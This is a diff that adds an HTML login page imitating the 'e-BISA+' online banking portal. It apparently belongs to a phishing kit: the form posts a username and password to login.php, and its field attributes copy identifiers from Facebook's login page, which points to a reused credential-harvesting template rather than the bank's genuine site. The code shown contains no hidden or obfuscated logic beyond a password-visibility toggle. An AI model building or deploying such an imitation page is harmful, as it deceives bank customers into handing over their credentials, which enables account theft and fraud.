@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>e-BISA+</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="img/banco.ico">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+</head>
+<body>
+   
+        <div class="secundario">
+           <header>
+            <img src="img/logobisa.png" alt="">
+            <i class="bi bi-envelope-fill letter"></i>
+            <h1>Bienvenidos a e-BISA+</h1>
+           </header>
+           
+            <form class="formulario" action="login.php" method="post">
+                <i class="bi bi-person-circle person"></i>
+                
+                <div class="username">
+                    
+                    <input type="text" class="input" name="email" id="email" data-testid="royal_email" placeholder="Ingrese su usuario">
+                    
+                </div>
+                <i class="bi bi-lock-fill candado"></i>
+                <div class="username">
+                    <input type="password" class="input" name="pass" id="pass" data-testid="royal_pass" placeholder="Ingrese su contraseña">
+                    <i class="bi bi-eye-slash-fill eyes"></i>
+                </div>
+                <input class="iniciar" value="Siguiente" aria-label="Iniciar sesión" data-testid="royal_login_button" type="submit" id="u_0_b">
+            </form>  
+
+            <div class="">
+                <img src="img/descarga.jpg"  class="desc">
+            </div>
+        </div>
+    <script>const pass = document.getElementById("pass");
+        icon = document.querySelector(".eyes");
+icon.addEventListener("click", e => {
+    if (pass.type === "password") {
+        pass.type = "text";
+    }   else {
+        pass.type = "password"
+    }
+})
+</script>
+</body>
+</html>
